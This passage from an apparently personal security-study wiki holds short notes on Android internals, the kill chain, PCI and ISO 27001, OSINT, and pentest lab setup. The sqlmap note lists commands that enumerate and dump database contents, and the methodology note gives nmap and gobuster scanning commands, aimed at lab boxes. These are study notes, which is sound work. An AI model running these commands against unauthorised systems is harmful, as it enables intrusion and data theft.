-   ENISA Framework: ISMS framework
-   ISF: Information Security Framework
-   CIS 20: Critical Security Controls

### Vulnerabilities

-   [[idor-insecure-direct-object-references]]#

### Ethical Hacking

#### Fundamentals

-   [[cyber-kill-chain-methodology]]#
-   [[ttps-tactics-techniques-and-procedures]]#
-   [[ioc-indicators-of-compromise]]#
-   [[pentest-methodology-quick-example]]#

#### Reconnaissance/Footprinting

-   [[what-is-reconnaissance-footprinting]]#

#### Enumeration/Scanning

-   [[scanning-networks]]#
-   [[information-gathering-with-sqlmap]]#


===

<!-- Source: computing/security/android.md -->
<!-- URL: /computing/security/android -->
<!-- Title: Android -->
<!-- Wikilinks: [[computing/security/android]], [[security/android]], [[android]] -->

---
date: 2023-04-19T05:57:08JST
---

Android
=======

-   [[android-architecture]]#
-   [[android-virtual-machines]]#


===

<!-- Source: computing/security/android/android-architecture.md -->
<!-- URL: /computing/security/android/android-architecture -->
<!-- Title: Android Architecture -->
<!-- Wikilinks: [[computing/security/android/android-architecture]], [[security/android/android-architecture]], [[android/android-architecture]], [[android-architecture]] -->

---
date: 2023-04-19T05:35:11JST
---

Android Architecture
====================

The Android Operating System has several general layers, each with a set
of specialized functionalities.

The **Application** layer is where the individual applications
(installed from a store or locally), reside.

The **Application Framework** layer exposes system APIs for common
functionality that is commonly used by applications. Some of those
functionality are display visual elements, share data, or access
telephone or GPS functionality.

The **Library** layer contains C and C++ libraries which handle
low-level processes, such as graphics drawing, network encryption,
multimedia playback and image rendering.

As a subset of the Library layer, there is the **Android Runtime**
layer, which represents the area of the OS where the VM responsible for
running applications resides.

The Android Runtime Layer contains the following Java libraries:

-   Dalvik VM Specific Libraries: for interaction with a Dalvik VM
    instance
-   Java Interoperability Libraries: subset of Java Core Libraries
    adapted for use in the Dalvik VM
-   Android Libraries: libraries used in application development and
    responsible for most of the core functionality of applications

Finally, the **Linux Kernel** layer is the underlying layer that ties
all of the upper layers together. It arbitrates all access to the
underlying device hardware, via device drivers. Just like a computer,
the kernel also handles memory, processes, and power management. More
information on the Linux kernel
[here](https://en.wikipedia.org/wiki/Linux_kernel).


===

<!-- Source: computing/security/android/android-virtual-machines.md -->
<!-- URL: /computing/security/android/android-virtual-machines -->
<!-- Title: Android Virtual Machines -->
<!-- Wikilinks: [[computing/security/android/android-virtual-machines]], [[security/android/android-virtual-machines]], [[android/android-virtual-machines]], [[android-virtual-machines]] -->

---
date: 2023-04-20T05:44:30JST
---

Android Virtual Machines
========================

Virtual machines are abstraction layers between an application and the
underlying Android device.

Android apps are written in Java but are compiled (thanks to Android
Studio) into platform independent **D**alvik **EX**exutable, or [DEX
bytecode](https://source.android.com/docs/core/runtime/dalvik-bytecode),
or ODEX (**O**ptimized **DEX**). OAT files is a newer format used by the
Android Runtime (read more below) which offers significant performance
enhancements.

Note: Apps downloaded on stores use the DEX format. ODEX is used by OEMs
to optimize apps that run at boot-time, for a specific device or
architecture.

Android VM run the DEX bytecode directly compiled from the original
Java. This handles translations of the differences between different
operation system versions and is the same concept as in Java: it exists
so developers don't need to be concerned with the underlying hardware or
OS versions. This, of course, results in a performance loss compared to
the same functionality implemented in "native code" (C, C++, etc). One
security benefit from not using native code (via [Android
NDK](https://developer.android.com/ndk)) is that Android apps do not
suffer from the same type of memory corruption issues, such as buffer
overflows.

Note: Prior to KitKat (v4.4), Android exclusively used the Dalvik VM.
After, Android began using the Android Runtime (ART) VM. Dalvik VM was
phased out entirely with Lollipop (v5.0). The differences between the
two VM technology has [security
impacts](https://source.android.com/docs/core/runtime).

Android apps are typically developed in Java, however it is possible to
use native code as well for high performance applications, such as
games. In that case, the VM still executes the `.dex` file, and handles
interaction with the native code.


===

<!-- Source: computing/security/cyber-kill-chain-methodology.md -->
<!-- URL: /computing/security/cyber-kill-chain-methodology -->
<!-- Title: Cyber Kill Chain Methodology -->
<!-- Wikilinks: [[computing/security/cyber-kill-chain-methodology]], [[security/cyber-kill-chain-methodology]], [[cyber-kill-chain-methodology]] -->

---
date: 2022-08-19
---

Cyber Kill Chain Methodology
============================

Cyber kill chain methodology is a seven phases methodology created by
[Lockheed Martin](https://lockheedmartin.com/). It acts as a framework
for securing cyberspace based on a concept of military kill chain.

1.  **Reconnaissance:** gather information on intended target (passive
    step such as OSINT, technology used in website and email, `whois`,
    DNS, footprint, open ports…)
2.  **Weaponization:** analyze gathered information and identify
    vulnerabilities and technique to gain access. Create malicious
    customized payload and target specific devices. Phishing.
3.  **Delivery:** deliver the payload (email, USB drop, links…)
4.  **Exploitation:** exploit hardware and software vulnerabilities.
    This is a "make or brake" phase; it will either work or the security
    controls of the company will prevent the exploit
5.  **Installation:** Install the payload and even more, like backdoor.
    Also hide the backdoor.
6.  **Command and Control (C&C):** two-way channel between target system
    and attacker system. Leverage privilege escalation if possible. Hide
    compromise of system with encryption
7.  **Action on Objectives:** start stealing the targeted asset
    (customers records etc), use denial of service (DOS) to affect the
    environment or use the system as a launching point to perform other
    attack.


===

<!-- Source: computing/security/cybersecurity-home-lab-environment.md -->
<!-- URL: /computing/security/cybersecurity-home-lab-environment -->
<!-- Title: Cybersecurity Home Lab Environment -->
<!-- Wikilinks: [[computing/security/cybersecurity-home-lab-environment]], [[security/cybersecurity-home-lab-environment]], [[cybersecurity-home-lab-environment]] -->

---
date: 2022-08-18
---

Cybersecurity Home Lab Environment
==================================

Target Machines
---------------

:::{.highlight-block}
[HeiDoc.net
Tool](https://heidoc.net/joomla/technology-science/microsoft/67-microsoft-windows-and-office-iso-download-tool)
can be used to easily download Windows ISO instead of going through the
download pages.
:::

-   [Windows Server
    2016](https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2016)
    or different version
-   [Windows 10
    Entreprise](https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise)
-   [Older
    Windows](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/)
-   [Metasploitable](https://information.rapid7.com/download-metasploitable-2017-thanks.html)
-   [OWASP Broken Web
    Applications](https://owasp.org/www-project-broken-web-applications/migrated_content)

Attack Machine
--------------

-   [Kali Linux](https://www.kali.org/get-kali/)

With the ISO downloaded, we can create our
[[pentest-home-lab-environment-with-qemu-kvm]]#.


===

<!-- Source: computing/security/data-on-payment-card.md -->
<!-- URL: /computing/security/data-on-payment-card -->
<!-- Title: Data on Payment Card -->
<!-- Wikilinks: [[computing/security/data-on-payment-card]], [[security/data-on-payment-card]], [[data-on-payment-card]] -->

---
date: 2022-01-09T15:39
---

Data on Payment Card
====================

Payment Card have a standard format with the following information:

Front:

-   Issuer name (bank or institution that issued the card)
-   (Maybe) Contactless indicator (this card can use contactless
    payment)
-   EMV chip (secure transaction)
-   Primary account number (PAN, 15, 16 or 19-digit number)
-   Bank Identification Number (BIN, the first 6 or 8 numbers of the
    PAN)
-   Expiration date
-   Cardholder name
-   Card brand

Back:

-   Magnetic stripe (track data, Track 1 and Track2, all the data on the
    front of the card)
-   Signature strip (that nobody check)
-   Hologram (anti-forgery)

Magnetic Stripe
---------------

Track 1 is 80 characters long containing:

-   PAN
-   Card holder's name
-   Expiration date
-   Service code (what sort of card it is)
-   Sensitive Authentication Data, it can be
    -   a not printed secret called Card Verification Value (CVV) by
        Visa and Card Validation Code (CVC) by Mastercard[^1]
    -   a number to validate the PINs, called a PIN Verification Value
        or PVV
-   The rest of the characters can be whatever the card issuer wants to
    add in there.

The first half up to the service code can be stored but after that **you
cannot store it according to PCI DSS**.

Track 2 is 40 characters:

-   PAN
-   Expiration date
-   Service code
-   Same as Track 1: anything the card issuer want. Can't be stored.

[^1]: Note that this is different than the secret number on the back of
    the card which is confusingly called CVV2, CAV2, CVC2 or CVN2
    depending on the card issuer. This is to not allow criminals to
    clone a card if they get hold of credit card information on Internet
    and vice versa.


===

<!-- Source: computing/security/difference-between-penetration-tester-and-red-teamer.md -->
<!-- URL: /computing/security/difference-between-penetration-tester-and-red-teamer -->
<!-- Title: Difference Between Penetration Tester and Red Teamer -->
<!-- Wikilinks: [[computing/security/difference-between-penetration-tester-and-red-teamer]], [[security/difference-between-penetration-tester-and-red-teamer]], [[difference-between-penetration-tester-and-red-teamer]] -->

---
date: 2022-08-28
---

Difference Between Penetration Tester and Red Teamer
====================================================

Short description of a few offensive security roles:

Penetration Tester
------------------

Responsible for testing technology products for finding exploitable
security vulnerabilities.

Red Teamer
----------

Plays the role of an adversary, attacking an organization and providing
feedback from an enemy's perspective.


===

<!-- Source: computing/security/economy-of-mechanism.md -->
<!-- URL: /computing/security/economy-of-mechanism -->
<!-- Title: Economy of Mechanism -->
<!-- Wikilinks: [[computing/security/economy-of-mechanism]], [[security/economy-of-mechanism]], [[economy-of-mechanism]] -->

---
date: 2022-12-31
---

Economy of Mechanism
====================

Behind those somewhat convoluted words, economy of mechanism simply means
that the more complex a system is, the more likely security
vulnerabilities will be present, *and* the more likely it will be missed
during a review.

This is because the time to review and find vulnerabilities increases
(sometimes exponentially) the more mechanisms, or the more code there
is.

According to Bishop[^1] in Chapter 13, "Design Principles," in
"Principle of Economy of Mechanism" from pages 344-345:

> This principle simplifies the design and implementation of security
> mechanisms.
>
> Definition 13-3. The principle of economy of mechanism states that
> security mechanisms should be as simple as possible.
>
> If a design and implementation are simple, fewer possibilities exist
> for errors. The checking and testing process is less complex, because
> fewer components and cases need to be tested. Complex mechanisms often
> make assumptions about the system and environment in which they run.
> If these assumptions are incorrect, security problems may result.
>
> Interfaces to other modules are particularly suspect, because modules
> often make implicit assumptions about input or output parameters or
> the current system state; should any of these assumptions be wrong,
> the module's actions may produce unexpected, and erroneous, results.
> Interaction with external entities, such as other programs, systems,
> or humans, amplified this problem.
>
> > **Example 1**
> >
> > The ident protocol sends the user name associated with a process
> > that has a TCP connection to a remote host. A mechanism on host A
> > that allows access based on the results of an ident protocol result
> > makes the assumption that the originating host is trustworthy. If
> > host B decides to attack host A, it can connect and then send any
> > identity it chooses in response to the ident request. This is an
> > example of a mechanism making an incorrect assumption about the
> > environment (specifically that host B can be trusted).
>
> > **Example 2**
> >
> > The finger protocol transmits information about a user or system.
> > Many client implementations assume that the server's response is
> > well-formed. However, if an attacker were to create a server that
> > generated an infinite stream of characters, and a finger client were
> > to connect to it, the client would print all the characters. As a
> > result, log files and disks could be filled up, resulting in a
> > denial of service attack on the querying host. this is an example of
> > incorrect assumptions about the input to the client.

[Source](https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/economy-of-mechanism)

[^1]: Bishop, Matt. *Computer Security: Art and Science*. Boston, MA:
    Addison-Wesley, 2003.


===

<!-- Source: computing/security/gpg-unsafe-permissions.md -->
<!-- URL: /computing/security/gpg-unsafe-permissions -->
<!-- Title: Resolve GPG Unsafe Permissions -->
<!-- Wikilinks: [[computing/security/gpg-unsafe-permissions]], [[security/gpg-unsafe-permissions]], [[gpg-unsafe-permissions]] -->

---
date: 2020-12-21T09:11
---

# Resolve GPG Unsafe Permissions

Gnupg will produce an error such as the one below if ownership and
permissions of the directory are not right.

```sh
gpg: WARNING: unsafe permissions on homedir '/home/$USER/.gnupg'
```

This can (and by all mean should) be resolve easily with the following
commands:

```sh
chown -R $(whoami) ~/.gnupg/
chmod 600 ~/.gnupg/*
chmod 700 ~/.gnupg ~/.gnupg/crls.d ~/.gnupg/openpgp-revocs.d ~/.gnupg/private-keys-v1.d
```

On the last line, add/remove folders according to your environment.



===

<!-- Source: computing/security/idor-insecure-direct-object-references.md -->
<!-- URL: /computing/security/idor-insecure-direct-object-references -->
<!-- Title: IDOR: Insecure Direct Object References -->
<!-- Wikilinks: [[computing/security/idor-insecure-direct-object-references]], [[security/idor-insecure-direct-object-references]], [[idor-insecure-direct-object-references]] -->

---
date: 2022-08-28
---

IDOR: Insecure Direct Object References
=======================================

IDOR is a vulnerability that falls under Broken Access Control. It means
that an attacker can access information or perform actions not intended
for them.

An application using a user-supplied input to retrieve objects (files,
data, documents) and they are numbered sequentially (i.e. the pattern is
easy to figure out).


===

<!-- Source: computing/security/information-gathering-with-sqlmap.md -->
<!-- URL: /computing/security/information-gathering-with-sqlmap -->
<!-- Title: Information Gathering with sqlmap -->
<!-- Wikilinks: [[computing/security/information-gathering-with-sqlmap]], [[security/information-gathering-with-sqlmap]], [[information-gathering-with-sqlmap]] -->

---
date: '2023-06-04T18:10:11+0900'
---

# Information Gathering with sqlmap

**Step 0:** Test injection by hand first.

This is good practice to horn someone own skill.

Plus, `sqlmap` is just a tool and could use a very inefficient exploitation strategy if going fully automatic without prior manual testing.
In addition, `sqlmap` is a dangerous tool that could crash the remote service if not used correctly.

**Step 1:** Extract the database banner

``` {.sh}
sqlmap -u <target> --banner <other_options>
```

**Step 2:** List users of the database

``` {.sh}
sqlmap -u <target> --users <other_options>
```

**Step 3:** Check if database user is administrator

``` {.sh}
sqlmap -u <target> --is-dba <other_options>
```

**Step 4:** List available databases

``` {.sh}
sqlmap -u <target> --dbs <other_options>
```

**Step 5:** List tables of selected database

``` {.sh}
sqlmap -u <target> -D <database> --tables <other_options>
```

**Step 6:** List columns of one or more tables

``` {.sh}
sqlmap -u <target> -D <database> -T <table,table> --columns <other_options>
```

**Step 7:** Dump columns

``` {.sh}
sqlmap -u <target> -D <database> -T <table> -C <column,column> --dump <other_options>
```


===

<!-- Source: computing/security/install-kali-nethunter-on-pixel-3a.md -->
<!-- URL: /computing/security/install-kali-nethunter-on-pixel-3a -->
<!-- Title: Install Kali NetHunter on Pixel 3a -->
<!-- Wikilinks: [[computing/security/install-kali-nethunter-on-pixel-3a]], [[security/install-kali-nethunter-on-pixel-3a]], [[install-kali-nethunter-on-pixel-3a]] -->

---
date: '2023-06-04T11:51:32+0900'
---

# Install Kali NetHunter on Pixel 3a

This is an old guide I used for myself. It is most probably out of date
but it's a good start to install Kali on a Pixel phone that is not
supported natively (when this was written).

At some point I want to be able to deliver a Kernel to install Kali
NetHunter. But I will have to learn more on Android first.

1.  Decide on top of which ROM you want to install it and install it.
    [LineageOS](https://wiki.lineageos.org/devices/sargo/install) is a good
    start.
2.  Follow [installing
    instruction](https://www.kali.org/docs/nethunter/installing-nethunter/)
3.  Install [twrp](https://twrp.me/google/googlepixel3a.html)
4.  Install [Magisk](https://topjohnwu.github.io/Magisk/install.html)
5.  Install [NetHunter](https://forum.xda-developers.com/t/kernel-kali-nethunter-kernel-pixel-3a-and-3a-xl-sargo-bonito-kernel.4319283/)
    with twrp
    -   Need both `KaliNethunter-v8.2(22).zip` AND `Mad-Kali-MaxHunter-P3A-S`
        (in this order)
6.  Download nethunter app
7.  Give root to Nethunter app with Magisk
8.  Add permissions to Nethunter because of [this
    bug](https://gitlab.com/kalilinux/nethunter/apps/kali-nethunter-app/-/issues/306#note_917245006)
9.  Launch Nethunter app and follow instruction to install Kali chroot


===

<!-- Source: computing/security/ioc-indicators-of-compromise.md -->
<!-- URL: /computing/security/ioc-indicators-of-compromise -->
<!-- Title: IoC: Indicators of Compromise -->
<!-- Wikilinks: [[computing/security/ioc-indicators-of-compromise]], [[security/ioc-indicators-of-compromise]], [[ioc-indicators-of-compromise]] -->

---
date: 2022-08-19
---

IoC: Indicators of Compromise
=============================

Not intelligence. It's a source of information about a threat that can
serves as data points for intelligence.

They need to be checked not only at host level but also at network
level.

Unauthorized Software and Files
-------------------------------

Software that are not authorized to run on your network. This is why an
inventory of software is important to have.

Suspicious Emails
-----------------

Often used to send malicious data to a target. Email sender's email
address, joint files and headers can be good IoC.

Suspicious Registry and File System Changes
-------------------------------------------

Specially look for auto-starting at boot.

Unknown Ports and Protocol Usage
--------------------------------

Ports normally not used in normal operation is a good IoC. Seeing
excessive bandwidth usage on a system or network itself is also a good
indicator.

To recognize all of that, we need to know our current "baseline", i.e.
what ports are normally used, how much bandwidth usage is "normal use".

Rogue Hardware
--------------

An hardware that shouldn't be in the network.

Service Disruption and Defacement
---------------------------------

The later is obvious, the former, not so, as we need to recognize
malicious from non-malicious disruption.

Suspicious or Unauthorized Account Usage
----------------------------------------

Account of applications such as Sharepoint, Exchange, IIS, SQL etc. used
for other things that their primary function.


===

<!-- Source: computing/security/iso-iec-27001-in-practice.md -->
<!-- URL: /computing/security/iso-iec-27001-in-practice -->
<!-- Title: ISO/IEC 27001 in Practice -->
<!-- Wikilinks: [[computing/security/iso-iec-27001-in-practice]], [[security/iso-iec-27001-in-practice]], [[iso-iec-27001-in-practice]] -->

---
date: 2022-01-08T16:52
---

ISO/IEC 27001 in Practice
=========================

Establishing Scope
------------------

Scope are all the activities or services, people, processes, places and
data that will be subjected to the risk controls and processes to
implement for ISO.

Boundaries to establish scope:

-   External and internal factors
-   Interested parties
-   Relationship between activities performed by your organization and
    other organizations

Boundaries to consider:

-   Business activities
-   Location specific
-   Channel specific (on-line or off-line)
-   Specific product/services
-   Considerations from customer perspective

The first thing to do is lay down all the operations of a given system,
and determine what parts of the entire operation we want to select for
ISO 27001.

For example, a web application may have a core application with a
database which does all the core work. It may also have an onboarding
process for new client and a CRM with a support team, as well as a
billing system. Here we select which operation to put in the scope.
Depending on the goal of the company, one could choose to limit the
scope to operations which handle customer information and PII.

Risk Assessment
---------------

**Repeatable** Methodology for a risk assessment:

-   Criteria for accepting risk (appetite)
-   Identifying risks (CIA: Confidentiality, Integrity and Availability)
-   Analyzing risks
-   Evaluating risks

Determining Applicability
-------------------------

One *shall* justify for the inclusion or exclusion of controls and
whether to implement them or not.

After establishing the scope, one should go and check every control
presented by ISO 27001 and check if the control is applicable or not.
For each, the reason for the inclusion or exclusion must be clearly
written.

Required Documents
------------------

Mandatory Documents:

-   Procedures
-   Policies

Mandatory Records:

-   Internal Audit records
-   Correct Action records

Timeframes
----------

-   Stage 1 Audit: 1 day
-   Stage 2 Audit: 2 days
-   Entire process end-to-end: 12-18 months (assuming no ISO experience)


===

<!-- Source: computing/security/iso-iec-27001.md -->
<!-- URL: /computing/security/iso-iec-27001 -->
<!-- Title: ISO/IEC 27001 -->
<!-- Wikilinks: [[computing/security/iso-iec-27001]], [[security/iso-iec-27001]], [[iso-iec-27001]] -->

---
date: 2022-01-08T15:53
---

ISO/IEC 27001
=============

The purpose of the standard is to...

> ... preserves the confidentiality, integrity and availability of
> information by applying a risk management process...
>
> ```{=html}
> <footer>—ISO/IEC 27001:2013 Standard <cite>section 0.1</cite></footer>
> ```

This standard is not an IT standard but rather an information security
standard.

What it Means
-------------

ISO/IEC 27001 (below, ISO 27001) is a **specification** which outlines
the exact requirements for what is deemed as best practice in
information security. It is related to **management system for
information security** and **risk management**. It has two parts:

-   Management processes to implement
-   List of technical controls

It is created by the International Organization for Standardization
(ISO) and the International Electrotechnical Commission (IEC).

Differences Between ISO/IEC 27001 and ISO/IEC 27002
---------------------------------------------------

ISO 27001 is the international standard.

ISO 27002 is the code of practice or implementation guidance document
(can't be certified for this one).

Structure of the Standard
-------------------------

1.  Clauses 0 - 3: General Definitions & Content
2.  Clauses 4 - 10: 7 Clauses about your ISMS, Mandatory Compliance
3.  Annex A -: 114 controls and over 14 domains, Mandatory Compliance
4.  Bibliography - References

## In Practice

See [[iso-iec-27001-in-practice]]#


===

<!-- Source: computing/security/it-governance.md -->
<!-- URL: /computing/security/it-governance -->
<!-- Title: IT Governance -->
<!-- Wikilinks: [[computing/security/it-governance]], [[security/it-governance]], [[it-governance]] -->

---
date: 2022-01-08T14:40
---

IT Governance
=============

Business Management
-------------------

Business management is about:

-   **planing and organizing** business from within
-   It helps professional and companies to **control resources and
    results**
-   It is a form af **leadership of teams and people**

You can have management withoug governance, but no governance without
management.

Jobs in management inclues:

- Aquisitions Manager
- HR Manager
- Marketing Manager
- Operational Manager

Management must enable the business. Business Management is about
ensuring results.

## Governance

Governance is like piloting. It is about strategy.


===

<!-- Source: computing/security/osint-cycle.md -->
<!-- URL: /computing/security/osint-cycle -->
<!-- Title: The OSINT Cycle -->
<!-- Wikilinks: [[computing/security/osint-cycle]], [[security/osint-cycle]], [[osint-cycle]] -->

---
date: 2021-06-06T18:32
---

# The OSINT Cycle

The OSINT cycle, or intelligence cycle, describes the process of developing
and transforming raw information into finished intelligence with the
purpose of using the it in decision making and/or taking appropriate
further actions based on those findings.

There are several different cycle, generally with 4 to 6 steps. To meet
half-way let's review a 5-steps OSINT cycle.

1. Planning
2. Gathering
3. Analyzing
4. Dissemination
5. Feedback

## 1. Planning

Planning is the first and perhaps the most important step. To grasp the
importance of planning, we can quotei the 16th president of the United
States:

> Give me six hours to chop down a tree and I will spend the first four
> sharpening the axe.
> ― Abraham Lincoln

Before information gathering, we need to clearly define what we are looking
for. What kind of information do we wish to gather about our target? What
is the purpose of our investigation?

We also need to ask ourself which tools and vectors of investigation will
we use (library, published works etc)?

Now, the plan is not set in stone. _Au contraire_ it needs to be tweaked
along the way while we get new ideas and find better tools to conduct our
activities.

In this step, we also identify, prioritize and validate intelligence
requirements, ask for information, consider the availability of collected
data etc.

## 2. Gathering

Making a collection of the gathered data. Gathering is only limited by our
imagination and perhaps the tools we are using. The easiest way to start is
to use some Google-fu.

## 3. Analyzing

Gathering a ton of data is a good start but is useless in and of itself.
Analyzing, which involves validating the gathered information and making it
usable, is another crucial step.

## 4. Dissemination

Dissemination is the transfer of knowledge: convey the intelligence to the
consumer in an usable form; in other words: reporting. The format of the
report can be written, imagery, database, PowerPoint etc.

If applicable, report should be peer reviewed from independent eyes in the
same field but who has not participated in the conduct of the study. This
is to ensure objectivity and increase likehood of valid and reliable
report.

In practice, a disseminetion plan should be developed prior to the
completion of the study.

## 5. Feedback

Gettign the feedback from the customer or client. This step ensure the
gathered and disseminated information are correct, accurate, readable and
comprehensible. Indeed, intelligence needs to serve the goal of the client
going forward.


===

<!-- Source: computing/security/osint-introduction.md -->
<!-- URL: /computing/security/osint-introduction -->
<!-- Title: Introduction to OSINT -->
<!-- Wikilinks: [[computing/security/osint-introduction]], [[security/osint-introduction]], [[osint-introduction]] -->

---
date: 2020-10-08T00:18
---

# Introduction to OSINT

## What is OSINT?

OSINT stands for **O**pen **S**ource **Int**elligence. It refers to the
collection, processing and analysis of publicly available data that has been
deteremined to be of intelligence value.

The U.S. Department of Defense defines OSINT as:

> [Information] produced from publicly available information that is
collected, exploited, and disseminated[^1] in a timely manner to an
appropriate audience for the purpose of addressing a specific intelligence
requirement.

Sources of OSINT include surface, deep and dark web, social media, news media,
academic sources, and government records.

Contrary to other forms of intelligence, OSINT uses legally accessible
information, without breaching copyright and or privacy laws. _Open_ refers
to **overt**, publicly available sources, as opposed to **covert** sources
which are hidden and confidential.

This distinction makes OSINT accessible to people outside law enforcment.

## Difference Between Information and Data

OSINT interests itself in _information_ in contrast with just data. The
difference is best explained with an illustration.

Let's take some random numbers: 6 - 9 - 13 - 24 - 41

Out of context, they mean absolutely nothing. These numbers are just data:
numbers in that case but it  could have been random values like words and
characters.

Let's add some context: this are actually the winning lottery numbers of
[December 11th, 2020
(France)](https://www.bfmtv.com/loto/resultat-euromillions-le-tirage-du-vendredi-11-decembre-2020_AN-202012110368.html).

Now, this data becomes _information_ and it has much bigger value (it
would have even more value if it was the winning numbers for the _next_
lottery).

The main difference is: **the context**.

When you put data in the right context, it automatically becomes
information.

See also [[relationship-data-information-intelligence]]#.

## Types of OSINT

OSINT can be divided in two big categories: offenseive and defensive.

### Offensive

Gather information before an attack.

### Defensive

Learn about possible attacks (vector) against yourself, your company, your
client etc.

## The OSINT Cycle

See [[osint-cycle]]#.

[^1]: In this context it means "reported", which is one of the hardest part of OSINT.


===

<!-- Source: computing/security/pci-standards.md -->
<!-- URL: /computing/security/pci-standards -->
<!-- Title: PCI Standards -->
<!-- Wikilinks: [[computing/security/pci-standards]], [[security/pci-standards]], [[pci-standards]] -->

---
date: 2022-01-09T15:31
---

PCI Standards
=============

How Payment Card Transaction Works (Overview)
---------------------------------------------

Two actors, the merchant (e.g. a store etc) and a bank want to both make
sure:

-   They can process a credit card
-   There is enough found to go ahead with the purchase
-   The person is who they say they are

For this, the merchant sends an **Authorization Request** to the bank.
The bank responds with an **Authorization Response**.

This first exchange is the first step of a series of steps in a
transaction:

1.  Authorization (auth)
2.  Clearing
3.  Settlement
4.  Undo: Chargeback and Refunds

Data Stored on a Payment Card
-----------------------------

See [[data-on-payment-card]]#.

The Four-Party Model
--------------------

This model permits (with a lot of irregularities based on country etc) a
merchant to talk with every card issuer banks.

The parties are:

1.  Merchant
2.  Acquirer, or acquiring bank, who talks with a Card Scheme/Card Brand
    (Visa, JCB, Mastercard, Union Pay), who themselves talk with the
3.  Issuer (or issuing bank)
4.  Card-holder

There is also a three-party model where there is no acquirer or issuer
and the card scheme gives cards directly to card-holders and build
relationship directly to merchant (for example American Express Discover
(Diners) and JCB).

Clearing and Settlement
-----------------------

This step is where the merchant gets paid.

In clearing, the merchant sends a summary of all their day's
transactions to their acquirer. The data sends are the PAN, the
authorization reference and the amount. The acquirer relays the
information to the relevant card scheme which works out which
transactions for which issuing bank to send the information to. This
step is called **clearing**.

The issuing bank sends back the owned money to the card scheme. This is
called **settlement**. The acquirer receive the money from the card
scheme and sends it to each merchant.

E-Commerce Transaction
----------------------

The steps for an e-commerce transaction is similar to the transaction in
the real world, with the addition of (sometimes) a **Capture** step
after Authorization. It's used because there's a delay between the
merchant acceptation an e-commerce transaction and the goods actually
being sent to the customer.

On Internet, a client enters its PAN, CVV2, Cardholder Name and
Expiration Date. The merchant adds an merchant ID, name and amount and
sends everything to the acquirer. Like in the real world, the issuer
receives everything, check the transaction and sends back a
Response/Reference.

In some case, the merchant will also send a **Capture Request** to the
acquirer which contains a PAN and a Reference number. This is to confirm
the transaction is really happening.

Often, a new party called the Payment Service Provider (PSP) comes
between the merchant and the acquirer. Nowadays they are often called
Payment Facilitator (PF).

Undo
----

Their are two main undo possibilities:

### Refund

In the *refund* case, a merchant sends a refund message with a PAN,
cardholder name, expiration date and receive a response. With a PSP,
online, it's even easier: the merchant only sends a reference and the
amount. The PSP does the rest.

### Chargeback

The second is *chargeback*. It is initiated by the cardholder,
contacting their bank and stating that the transaction wasn't valid or
was fraudulent.

The issuing bank sends a PAN, merchant ID, reason and the amount to the
card scheme that then forwards it to acquirer. The acquirer contacts the
merchant to ask to prove the transaction was *valid*.

If the merchant agrees to the chargeback, the transaction is undone and
the card holder gets their money back. Otherwise, a dispute resolution
process starts, which is decided by the card scheme if the issuing bank
or acquiring bank can't agree.


===

<!-- Source: computing/security/pentest-home-lab-environment-with-qemu-kvm.md -->
<!-- URL: /computing/security/pentest-home-lab-environment-with-qemu-kvm -->
<!-- Title: PenTest Home Lab Environement with QEMU/KVM -->
<!-- Wikilinks: [[computing/security/pentest-home-lab-environment-with-qemu-kvm]], [[security/pentest-home-lab-environment-with-qemu-kvm]], [[pentest-home-lab-environment-with-qemu-kvm]] -->

---
date: 2022-08-20
---

PenTest Home Lab Environement with QEMU/KVM
===========================================

External
--------

We use this to update our system. Especially our Kali Linux box which
needs update from time to time.

NAT mode with IPv4 and DHCPv4 activated. For simplicity, IPv6 is
deactivated and DNS uses network name.

:::{.highlight-block}
This mode is similar to QEMU/KVM's default (aptly
named "default") virtual network. However as a rule I prefer to create
and configure rules myself.
:::

``` xml
<network>
  <name>pentest-external</name>
  <forward mode="nat"/>
  <domain name="pentest-external"/>
  <ip address="192.168.100.1" netmask="255.255.255.0">
    <dhcp>
      <range start="192.168.100.128" end="192.168.100.254"/>
    </dhcp>
  </ip>
</network>
```

Private (Isolated)
------------------

Virtualized network that is completely separate from the production
side, i.e., that cannot reach into the production side unless you want
it to.

Isolated mode with IPv4 enabled but DHCPv4 and IPv6 deactivated. DNS is
default (“Use network name”).

``` xml
<network>
  <name>pentest-private</name>
  <domain name="pentest-private"/>
  <ip address="192.168.100.1" netmask="255.255.255.0"/>
</network>
```

[Source](https://wiki.libvirt.org/page/VirtualNetworking#Virtual_Networking)


===

<!-- Source: computing/security/pentest-methodology-quick-example.md -->
<!-- URL: /computing/security/pentest-methodology-quick-example -->
<!-- Title: PenTest Methodology: Quick Example -->
<!-- Wikilinks: [[computing/security/pentest-methodology-quick-example]], [[security/pentest-methodology-quick-example]], [[pentest-methodology-quick-example]] -->

---
date: 2022-08-28
---

PenTest Methodology: Quick Example
==================================

This is a quick example of pentesting using boxes from
[TryHackMe](https://tryhackme.com/) or
[HackTheBox](https://www.hackthebox.com/). It's generally not *that*
easy but the general idea is the same.

Information Gathering
---------------------

Generally not required with box pwning as the information are in front
of our eyes.

See [[what-is-reconnaissance-footprinting]]# for more information.

Enumeration/Scanning
--------------------

### Port Scanning with `nmap`

One of the first step of a pentesting is "reconnaissance" or finding
information regarding the target. To gather information about the target
machine, one can use `nmap`, a free, open-source and powerful tool used
to discover hosts and services on a computer network.

A first step toward that would be to use the following command:

``` sh
nmap -sV <target_ip>
```

#### Often Used Flags

| nmap flag | Description                                                                         |
|===========|=====================================================================================|
| -sV       | Attempts to determine the version of the services running                           |
| -p        | `<x>` or -p- Port scan for port `<x>` or scan all ports                             |
| -Pn       | Disable host discovery and just scan for open ports                                 |
| -A        | Enables OS and version detection, executes in-build scripts for further enumeration |
| -sC       | Scan with the default nmap scripts                                                  |
| -v        | Verbose mode                                                                        |
| -sU       | UDP port scan                                                                       |
| -sS       | TCP SYN port scan                                                                   |

### Locating Directories

OWASP DirBuster is often used to brute force your way to a list of often
used directory names. We will, however, use GoBuster which is a similar
but modern and fast tool written in Go.

It is available to download on Kali Linux 2020.1+:
`sudo apt-get install gobuster` or on
[GitHub](https://github.com/OJ/gobuster).

Simple command:

``` sh
gobuster dir -u http://<ip>:<port> -w <word_list_location>
```

Note: On Kali Linux, word lists are under `/usr/share/wordlists`. For a
quick brute force, `directory-list-2.3-small.txt` is a good start.

#### Often Used Flags

| GoBuster flag     | Description                               |
|===================|===========================================|
| -e                | Print the full URLs in your console       |
| -u                | The target URL                            |
| -w                | Path to your word list                    |
